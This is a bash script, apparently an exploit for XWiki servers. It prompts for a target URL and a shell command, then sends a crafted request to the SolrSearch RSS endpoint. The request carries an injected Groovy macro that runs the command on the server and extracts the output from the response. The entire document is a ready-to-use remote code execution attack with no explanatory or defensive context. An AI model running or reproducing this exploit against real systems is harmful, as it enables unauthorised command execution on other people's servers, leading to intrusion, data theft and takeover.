#!/bin/bash
echo "MAKE SURE YOU INSTALL jq"
echo "sudo apt install jq"
echo ""
echo ""
echo "Enter the target XWIki URL"
echo "ex. http://10.0.0.1/  OR  http://some-wiki.com/xwiki"
read url
echo ""
echo "enter command you want to run"
echo "ex. id , whoami"
read reg_cmd
cmd=$(echo -n $reg_cmd | jq -Rr @uri)
curl -i "$url/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22$cmd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d" | awk -F'}}}' '{ print $2 }' | awk -F'&lt;/title' '{ print $1 }'
